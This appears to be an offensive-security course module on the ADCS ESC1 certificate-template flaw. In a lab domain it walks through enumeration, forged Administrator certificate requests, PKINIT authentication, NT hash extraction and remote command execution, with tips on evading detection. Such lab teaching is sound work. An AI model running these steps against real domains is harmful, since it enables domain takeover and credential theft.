## Misconfigured Certificate Templates: Subject Alternative Names ##

### Background ###

The X.509v3 standard for public key certificates contains an extension called Subject Alternative Names (SANs). This extension allows a certificate to define multiple identities for itself beyond just the subject. In other words, this allows the certificate to "belong" to multiple identities, and be used by and for each of those identities as needed. 

At first glance, this might seem somewhat strange to you. Why would you need a certificate to belong to multiple users? Everyone should have their own certificate, right? Truth be told, there are several potential use cases where this extension comes in handy. The most typical use for this particular function is with HTTPS certificates; it can become very complicated very quickly if you have a single web server hosting multiple domains that each need their own valid certificate. Sometimes, there are many domains being handled by that endpoint. As an example, take a look the below snippet from the SSL certificate for Youtube.com:

![[youtubecertSAN.png|center]]

This is only a brief snippet of this certificate; it contains over 100 SANs for domains related to Google. Managing an individual certificate at this endpoint for each one of these domains, understandably, is an untenable situation. In a case like this, this is a perfectly viable configuration that saves a lot of developers the headaches often intrinsic to PKI.

Serious issues can arise--however--when this configuration is enabled on certificates that can be used for authentication. In such a case, having a certificate bound to multiple users is already a security risk, but that risk becomes monumental when you allow the requester to *define their own SAN*. This is exactly the purpose of the configuration in the certificate template seen below in certsrv.msc:

![[ESC1config.PNG|center]]

This allows the entity requesting the certificate using this template to define whatever SANs they would like to be applied to the certificate. If this certificate is also configured with an EKU that allows for authentication (such as "Client Authentication"), then the requester can use a granted certificate with an arbitrarily defined SAN to assume the identity of *any domain user they would like*. 

The implications of this become obvious: if a template is configured in this manner, the certificate authority will issue certificates to any eligible user that can potentially contain arbitrary SANs, such as those of Domain Admins. The result is a breathtakingly simple escalation to complete domain compromise.


### Requirements ###

In order for a certificate template to be vulnerable to this attack, the following conditions must be met:

1. An attacker-controlled user must be allowed to enroll in a certificate defined by this template. This requires both the Certificate Authority and the template to allow enrollment rights to a user compromised by the attacker. Ideally, the certificate authority and template would allow low-privileged groups (such as "Everyone" or "Domain Users") enrollment permissions.
2. Manager approval must be disabled, and authorized signatures must be 0. In some cases, an attacker may also be able to bypass these two restrictions, such as through exploitation of ESC4 or ESC7.
3. The certificate template must define at least one EKU that enables domain authentication. These include the following (see the "Introduction to ADCS" section of this course for more details):
	- Client Authentication
	- PKINIT Client Authentication
	- Smart Card Logon
	- Any Purpose
	- No EKU defined
4. The certificate template allows requesters to specify a subjectAltName in the CSR.


### Enumeration ###

Each of the above conditions can be trivially enumerated with Certify.exe and Certipy.py, as well as searched for directly through LDAP queries, such as through PowerShell or `ldapsearch`.

The key configuration, allowing SANs in the CSR, is a part of the certificate template's AD object; specifically, it is defined by a flag set in its `mspki-certificate-name-flag` property called `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. If this flag is set, the configuration is present.

The following LDAP query will search for certificate templates that do not require approval or signatures, have one of the five EKU configurations that allow domain authentication, and have the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))
```

Here's an example of using this query with ldapsearch (only a snippet of full output shown):

![[ldapsearch.png|center]]

The Windows-native tool "certutil.exe" can be used to enumerate certificate templates to which the user has access (you'll see an example of this in the practical demonstration below):

`certutil.exe -v -dstemplate [template-name]`

SpecterOps' Certify.exe can also easily be used to search for these templates using the "find" command as such: 

`Certify.exe find /vulnerable`.

![[ESC1CertifyEnum.PNG|center]]

Certipy can also enumerate these templates. Note that by default, Certipy supplies the output in .txt and BloodHound-compatible .json formats unless the `-stdout` flag is supplied.

`certipy find -vulnerable`

![[ESC1CertipyEnum.PNG|center]]


### Exploitation ###

This vulnerability can be exploited in many ways; Certify and Rubeus can automate the certificate request and authentication portions respectively, and Certipy can automate the entire process. Any of these tools can also be used through a proxy to full effect. We will be looking at both of these below.

That being said, before I show you those options, I'd like to show you the manual method first. This is for two main reasons: firstly, you'll gain a greater understanding of how a key pair and CSR is constructed and sent to a CA server for signature using native Windows tools (as well as various certificate formats and how to manipulate them), and secondly you'll learn arguably the most stealthy way of executing attacks of this nature. Obviously Certify, Rubeus, and Certipy are convenient, but they contain signatures (such as in the default way they construct CSRs) that may be detected/alerted on, and if they are being run on a compromised host, you'll likely need to contend with antivirus and endpoint protection. Learning how to construct CSRs manually and submit them using certutil and certreq will likely be the most quiet (albeit most annoying) option available to you in many environments, as these binaries are not commonly monitored for this sort of activity at time of writing.

We will not be doing this manual exploitation for every exploit I'll be showing you in this course (as that would get redundant and annoying very fast), but I encourage you to experiment with creating and sending your own CSRs on your own initiative.

#### Manual ####

Firstly, we can use certutil.exe to enumerate the certificate authority and get detailed information on its templates with the following commands:
	- Get information on the available certificate authorities and their published templates: 
```PowerShell
certutil.exe -TCAInfo
```

	- Get detailed information on all certificate templates available (or a single template if you specify a template name): 
```
certutil.exe -v -dstemplate [template-name]
```

The latter command will produce a lot of output if you don't specify a single template, but careful perusal of it will reveal if one of the templates has the combination of configurations we are looking for, as seen below:

![[certutilEnum.PNG|center]]

The above snippet shows a template fittingly called "ESC1" which allows the "Domain Users" group to enroll as well as allows them to specify arbitrary SANs. The rest of the output (not shown here) also informs us that no manager approval or authorized signatures are required and that the "Client Authentication" EKU is specified. Great!

Switch over to your Kali attack machine and create the following config file (admin.config) which will define your CSR:

```
[ req ]
default_bits = 2048
prompt = no
req_extensions = user
distinguished_name = dn

[ dn ]
CN = Administrator

[ user ]
subjectAltName = otherName:msUPN;UTF8:administrator@InnsmouthNet.local
```

Ensure that the CN and subjectAltName are set appropriately to the high privilege user you would like to impersonate. The "default_bits" should be set to the `msPKI-Minimal-Key-Size` property of the template you are targeting.

Use OpenSSL to generate your CSR.

`openssl req -config admin.config -subj '/DC=local/DC=InnsmouthNet/CN=Users/CN=Administrator' -new -nodes -sha256 -out admin.req -keyout admin.key`

Then, transfer `admin.req` to your compromised workstation and submit the request.

`certreq -submit -config SRV-1\InnsmouthNet-SRV-1-CA -attrib "CertificateTemplate:ESC1" admin.req admin.cer`

![[certutilreq.PNG|center]]

**NOTE: CERTUTIL IS EXTREMELY PICKY; THE ABOVE COMMAND MUST BE EXECUTED VERY CAREFULLY. If you mess it up, such as leaving off the output file name (`admin.cer`/`admin.rsp`), there will be a popup of Windows Explorer on the user's desktop prompting them to choose a place to save them. We don't want to be burdening the users on our compromised workstations with such extraneous windows!**

At this point, `admin.cer` is your certificate! Transfer it (or copy/paste it) to your Kali machine and examine it with OpenSSL:

`openssl x509 -in admin.cer -text -noout`

Note the "Subject" and "EKU" fields and verify that they are set to the Administrator user and one of the correct EKUs that allow authentication respectively, and then you're all set to authenticate! I will show you how to authenticate with Rubeus and Certipy later on in this module, but first lets manually configure Kerberos from Kali. This will give us more authentication options with certificates and give us more insight into the process.

First we need the certificate of the certificate authority for the PKINIT module on our Kali machine. PKINIT will match a certificate to a principal in Active Directory and ascertain if the authenticating certificate is trusted based on the CA certificate we provide it. Run the following command on the Windows workstation to retrieve the CA certificate. Note that as before, certutil is extremely picky, and PowerShell will throw errors about invalid arguments unless you execute it using `cmd.exe /c`:

IF FROM CMD:
`certutil -config SRV-1\InnsmouthNet-SRV-1-CA -ca.cert ca.cer`

IF FROM POWERSHELL:
`cmd.exe /c "certutil -config SRV-1\InnsmouthNet-SRV-1-CA -ca.cert ca.cer"`

Copy/paste the base64 certificate from the output of this command (including the "BEGIN CERTIFICATE" amd "END CERTIFICATE" lines) to your Kali machine into a file called "ca.cer". The output file from this command on the Windows workstation, ca.cer, is required for certutil but can and should be deleted at this point because we don't need it (it is in raw binary format and we want the base64).

Now, you need to configure krb5 for the correct realm on your Kali machine. Write the following to /etc/krb5.conf. **Make sure to fill in the correct paths for the certificates and key**. I also recommend backing up the current file at that location just in case. The caps in this file (for the domain/realm) are very important, so don't neglect them:

```
[libdefaults]
        default_realm = INNSMOUTHNET.LOCAL

[realms]
        INNSMOUTHNET.LOCAL = {
                kdc = INNSMOUTH-DC.INNSMOUTHNET.LOCAL
                admin_server = INNSMOUTH-DC.INNSMOUTHNET.LOCAL
                pkinit_anchors = FILE:/path/to/ca.crt
                pkinit_identities = FILE:/path/to/admin.cer,/path/to/admin.key
                pkinit_kdc_hostname = INNSMOUTH-DC.INNSMOUTHNET.LOCAL
                pkinit_eku_checking = kpServerAuth
        }

[domain_realm]
        .InnsmouthNet.local = INNSMOUTHNET.LOCAL
```

Add the IP address of Innsmouth-DC to your /etc/hosts file as such:

`10.10.10.2     Innsmouth-DC Innsmouth-DC.InnsmouthNet.local INNSMOUTH-DC`

From here, you should be able to authenticate to Kerberos from Linux using the typical "kinit" command:

`kinit robert.olmstead@INNSMOUTHNET.LOCAL`

If you get no output, it usually means the command completed without error. You can check it with:

`klist`

![[kinitExample.PNG|center]]

NOTE: If you get a "client name mismatch" error here, try commenting out the lines that start with "pkinit" in your /etc/krb5.conf file (prepend those lines with a `#`). I find that sometimes Kerberos gets confused if you're authenticating as a different person than is listed here. Remember to uncomment them before proceeding to the next steps, where you will actually be authenticating as Administrator.

This should show basic information about the ticket you requested for robert.olmstead in the previous command. If it does not or you get an error with kinit, double-check your /etc/krb5.conf file. You can get detailed debugging information by prepending `KRB5_TRACE=/dev/stdout` to your kinit command for troubleshooting.

You can also clear out your ticket cache with the following command, which you should do before proceeding just to be safe:

`kdestroy`

Now, you can authenticate to Kerberos using your generated certificate for Administrator. **Again, ensure that you replace the placeholders with the actual paths to those files**:

`kinit -V -X X509_user_identity=FILE:/path/to/admin.cer,/path/to/admin.key administrator@INNSMOUTHNET.LOCAL`

Note that specifying the certificate on the command line *should be* redundant since we are hard-coding them in the krb5.conf file, but I find that this helps prevent weird errors and failures by specifying both. Regardless, if your output ends with something like "Authenticated to Kerberos", you can most likely take that as a success. Double check you got the ticket with `klist`, though, before proceeding.

From here, you can authenticate to the domain controller in a variety of ways and execute commands, proving your new elevated permissions as Administrator! Here's an example, using Evil-WinRM:

`evil-winrm -i Innsmouth-DC.InnsmouthNet.local -r InnsmouthNet.local`

Note that Kerberos hates IP addresses, so the above FQDN must be in your /etc/hosts file as well and mapped to the domain controller for Evil-WinRM to auth successfully. This also applies for just about every other tool you're going to be using this ticket with; it's just how Kerberos works. Get used to it.

You can also use this keyring TGT with impacket if you locate the ccache file in /tmp (the name will be in the kinit output above), which is where KRB5 stores them. Here's an example of authenticating with WMIExec:

`KRB5CCNAME=/tmp/krb5cc_1000 impacket-wmiexec -k -no-pass -dc-ip 10.10.10.2 Administrator@Innsmouth-DC.InnsmouthNet.local`

![[AdminAuth.PNG|center]]

![[ESC1-Manual.mov|center]]

#### Certify and Rubeus ####

Tools like Certify.exe from SpecterOps drastically streamline the exploitation of this and many of the other vulnerabilities we will explore in this course. The following example simulates the use of these tools on a compromised, domain-joined host, although the same process could be followed from an attacking Windows machine, such as through a proxy into the target network.

First, log in to the compromised workstation as robert.olmstead. The necessary binaries are located in `C:\tools` for convenience. Use Certify.exe to identify vulnerable templates:

`Certify.exe find /vulnerable`

![[certifyEnum.PNG]]

Note the appropriately named "ESC1" template, which Certify identifies as "vulnerable" due to having the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set along with all the other requirements. Certify can now be used to request a certificate with an arbitrary SAN, as such:

`Certify.exe request /ca:SRV-1.InnsmouthNet.local\InnsmouthNet-SRV-1-CA /template:ESC1 /altname:Administrator`

![[certifyReq.PNG|center]]

Copy the resulting certificate *and private key* into a file (everything between "BEGIN RSA PRIVATE KEY" and "END CERTIFICATE") on your Kali machine, naming it "admin.pem". Then, convert that .pem file to a .pfx using the following command. OpenSSL will ask you to input a password to encrypt the pfx; you can choose to do so or not, but for the sake of demonstration I will be using the password "PFXPASS"

`openssl pkcs12 -in admin.pem -keyex -CSP "Microsoft Enhanced  Cryptographic Provider v1.0" -export -out admin.pfx`

Transfer that PFX to the Windows workstation and use Rubeus in a PowerShell window to authenticate:

`Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:PFXPASS /ptt`

![[RubeusTGT.PNG|center]]

The `/ptt` flag in the above command will instruct Rubeus to inject the ticket into your current session. You can then issue commands to leverage your new, elevated access, such as by listing the contents of directories on the domain controller as seen below:

![[RubeusPTT.PNG|center]]

Note that this new Administrator TGT can also be copy/pasted to your Linux machine, saved as a ".kirbi" file, and then converted using Impacket's ticketconverter.py into a ccache file. From there, it can be used by CrackMapExec, Impacket, and so on just as we saw earlier in the "Manual" exploitation section.

![[ESC1-Certify&Rubeus.mov|center]]

#### Certipy ####

Certipy.py streamlines this exploitation even further. The following example will simulate using Certipy directly from a malicious Linux machine on a target network, but the same could easily be done through a proxy on a compromised host or even on a compromised Linux server (for example) as well.

Certipy has a `find` command much like Certify to identify CAs and vulnerable templates. Note that by default, Certipy will try to write output from this command to two files, one in JSON format and one in plaintext format. Adding the `-stdout` param will cause it to write to the terminal. `vulnerable` will limit output to only those templates detected to be vulnerable to a known misconfiguration scenario. `-enabled` tells Certipy to only show currently published templates:

```BASH
certipy find -u robert.olmstead -p 'SeekTheCheapestRoute!' -dc-ip 10.10.10.2 -vulnerable -stdout -enabled
```

![[certipyFind.PNG|center]]

First, request a certificate with the Administrator SAN using Certipy's "req" command. The `-upn` parameter specifies a User Principal Name to add to the SANs, and the `-dns` parameter specifies a DNS name to add. If you're wondering why we are adding both, we don't really need to do so but trust me and do it. Just bear with me for now.

![[220.png|center]]

`certipy req -username robert.olmstead@innsmouthnet.local -password 'SeekTheCheapestRoute!' -ca INNSMOUTHNET-SRV-1-CA -target SRV-1.InnsmouthNet.local -template ESC1 -upn Administrator@innsmouthnet.local -dns Innsmouth-DC.InnsmouthNet.local -dc-ip 10.10.10.2`

![[certipyReq.PNG|center]]

Certipy will automatically save the resulting certificate as a PFX named "administrator_innsmouth-dc.pfx". You can then use it to auth by using Certipy with the "auth" command. Note that if Certipy detects multiple possible subject names in the authenticating certificate, it will ask you which you should use. In this case, ensure that you select the one for "Administrator", which here is represented by "0":

`certipy auth -pfx administrator_innsmouth-dc.pfx -dc-ip 10.10.10.2`

![[certipyAuth.PNG|center]]

Notice that somehow, through some arcane black magick, Certipy has also somehow managed to divine the user's NTLM password hash as well! This is actually a unique feature of the PKINIT module: when a TGT is requested using a certificate through this module, the resulting ticket contains a special structure called PAC_CREDENTIAL_INFO, which contains the LM and NT hashes of the user! The intended purpose of this is to allow the user to seamlessly switch to NTLM authentication with services that don't support Kerberos, since certificates are intended to be a password-less form of authentication (such as when they are used with smart cards).

If you're curious how this NT hash is obtained, here's the high-level rundown: the PAC_CREDENTIAL_INFO in the TGT, like the rest of the ticket, is encrypted with the NT hash of the krbtgt account, so it cannot be decrypted by us. However, if we then use this TGT to request a TGS, particularly through the U2U mechanism (which is intended for a user attempting to authenticate to itself), the resulting TGS contains the PAC_CREDENTIAL_INFO in its PAC, which has been encrypted by the session key. Since we have the session key (from the AS-REP), we can now decrypt this! The TL;DR here is that through the magic of certificates, you can actually extract a user's NT hash using malign, esoteric Kerberos sorcery!

The resulting TGT (saved as "administrator.ccache") can be used with CrackMapExec, Impacket, and other tools to authenticate to hosts and leverage your elevated access. Of course, you can also use the NT hash you've obtained, or even crack it and use the cleartext credentials!

`KRB5CCNAME=administrator.ccache crackmapexec smb Innsmouth-DC -u Administrator -k`

![[cme.PNG|center]]

`KRB5CCNAME=administrator.ccache impacket-wmiexec Administrator@Innsmouth-DC -k`

![[wmiexec.PNG|center]]

If desired, you can also use Impacket's ticketconverter.py to convert this ccache file to a kirbi file and transfer it to your compromised workstation, then inject it into your session using Rubeus.

Now, about those two SANs we specified on the command line when we requested the certificate. As a reminder, we specifically requested a certificate with both `Administrator@InnsmouthNet.local` and `Innsmouth-DC.InnsmouthNet.local` names. You can see this if you use OpenSSL to display information about the certificate:

```BASH
openssl x509 -in administrator_innsmouth-dc.pfx -text -noout
```

![[SANs.PNG|center]]

We did not do this on the previous examples, but I'm doing it here to prove a point: the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag, by design, allows us to specify as many SANs as we would like. We could put every domain user and machine in here if we wanted to. But does this mean we can use this certificate to authenticate as any user or machine that is listed in our SANs?

As a matter of fact, it absolutely does mean exactly that:

![[DCauth.PNG|center]]

As seen above, we can use the same certificate to authenticate as robert.olmstead (who is still listed as the Subject), Administrator, or the domain controller itself! All through the magic of Subject Alternative Names. Hopefully you see now how powerful and dangerous `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is!

![[ESC1-Certipy.mov|center]]

### Extra Mile ###

1. Practice using Impacket's ticketconverter.py to play with .kirbi and .ccache files, transfering Kerberos tickets requested through Rubeus and Certipy back and forth. Try using a Kerberos ticket requested from a Linux tool on Windows using Rubeus, and try using a ticket requested by Rubeus on your Kali attack box

### References ###

[Certified Pre-Owned: Abusing Active Directory Certificate Services]([Certified_Pre-Owned.pdf (specterops.io)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))
[Kerberos PKINIT from Linux](https://elkement.blog/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/#12)
[Certify Github](https://github.com/GhostPack/Certify)
[Certipy Github](https://github.com/ly4k/Certipy)
